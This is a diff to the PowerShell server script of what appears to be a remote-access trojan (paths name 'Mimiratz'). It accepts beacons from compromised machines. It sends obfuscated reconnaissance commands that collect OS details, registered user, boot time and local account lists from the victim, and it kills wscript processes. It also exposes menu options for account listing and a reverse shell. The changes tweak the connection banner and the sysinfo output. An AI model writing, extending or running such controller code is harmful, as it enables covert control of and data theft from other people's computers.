@@ -746,6 +746,18 @@ $Client = $Socket.AcceptTcpClient();
 $Remote_Host = $Client.Client.RemoteEndPoint.Address.IPAddressToString
 Write-Host "[-] Beacon received: $Remote_Host" -ForegroundColor Green
 
+$AllSettings = Get-NetAdapter | Select-Object * | Where-Object { $_.Status -iMatch '^(Up)$' }
+$Netsped = ($AllSettings).LinkSpeed
+$NetName = ($AllSettings).Name
+
+Write-Host "`n`n    Adapter: $NetName  Speed: $Netsped"
+Write-Host "    Connection: [" -NoNewline
+Write-Host "$Local_Host" -ForegroundColor Green -NoNewline
+Write-Host "] => [" -NoNewline
+Write-Host "$Remote_Host" -ForegroundColor Red -NoNewline
+Write-Host "]"
+
+
 #Play sound on session creation
 $PlayWav = New-Object System.Media.SoundPlayer
 $PlayWav.SoundLocation = "${IPATH}\Mimiratz\theme\ConnectionAlert.wav"
@@ -767,9 +779,8 @@ $WindowsDirectory = Char_Obf("(Get-WmiObject Win32_OperatingSystem).WindowsDirec
 $RegisteredUser = Char_Obf("(Get-CimInstance -ClassName Win32_OperatingSystem).RegisteredUser");
 $BootUpTime = Char_Obf("(Get-CimInstance -ClassName Win32_OperatingSystem).LastBootUpTime.ToString()");
 
-
 #Sysinfo command at first time run (connection)
-$Command = "cd `$Env:TMP;`"`n`n    DomainName     : `"+$Name+`"``n    RemoteHost     : `"+`"$Remote_Host`"+`"``n    BootUpTime     : `"+$BootUpTime+`"``n    RegisteredUser : `"+$RegisteredUser+`"``n    OP System      : `"+$System+`"``n    OP Version     : `"+$Version+`"``n    Architecture   : `"+$Architecture+`"``n    SystemDir      : `"+$syst_dir+`"``n    WorkingDir     : `"+$RhostWorkingDir+`"``n    ProcessorCPU   : `"+$Processor;echo `"`";Get-WmiObject Win32_UserAccount -filter 'LocalAccount=True'| Select-Object Disabled,Name,PasswordRequired,PasswordChangeable|ft -AutoSize|Select -SkipLast 1;If(Get-Process wscript -EA SilentlyContinue){Stop-Process -Name wscript -Force}";
+$Command = "cd `$Env:TMP;`"    DomainName     : `"+$Name+`"``n    Architecture   : `"+$Architecture+`"``n    RemoteHost     : `"+`"$Remote_Host`"+`"``n    BootUpTime     : `"+$BootUpTime+`"``n    RegisteredUser : `"+$RegisteredUser+`"``n    OP System      : `"+$System+`"``n    OP Version     : `"+$Version+`"``n    SystemDir      : `"+$syst_dir+`"``n    WorkingDir     : `"+$RhostWorkingDir+`"``n    ProcessorCPU   : `"+$Processor;If(Get-Process wscript -EA SilentlyContinue){Stop-Process -Name wscript -Force}";
 
 
 While($Client.Connected)
@@ -1458,7 +1469,7 @@ While($Client.Connected)
       If($choise -ieq "Accounts" -or $choise -ieq "acc")
       {
          write-host " * Listing remote host accounts." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "";
-         $Command = "Get-WmiObject Win32_UserAccount -filter 'LocalAccount=True'| Select-Object Disabled,Name,PasswordRequired,PasswordChangeable,Caption|Format-Table -AutoSize|Out-File users.txt;Start-Sleep -Seconds 1;`$Out = Get-Content users.txt|Select -Skip 1|Select -SkipLast 2;If(-not(`$Out)){echo `"   [x] Error: cmdlet cant retrive remote host accounts ..`"}Else{echo `$Out};Remove-Item -Path users.txt -Force"
+         $Command = "Get-WmiObject Win32_UserAccount -filter 'LocalAccount=True'| Select-Object Name,PasswordRequired,PasswordChangeable,Caption|Format-Table -AutoSize|Out-File users.txt;Start-Sleep -Seconds 1;`$Out = Get-Content users.txt|Select -Skip 1|Select -SkipLast 2;If(-not(`$Out)){echo `"   [x] Error: cmdlet cant retrive remote host accounts ..`"}Else{echo `$Out};Remove-Item -Path users.txt -Force"
       }
       If($choise -ieq "RevShell" -or $choise -ieq "Shell")
       {
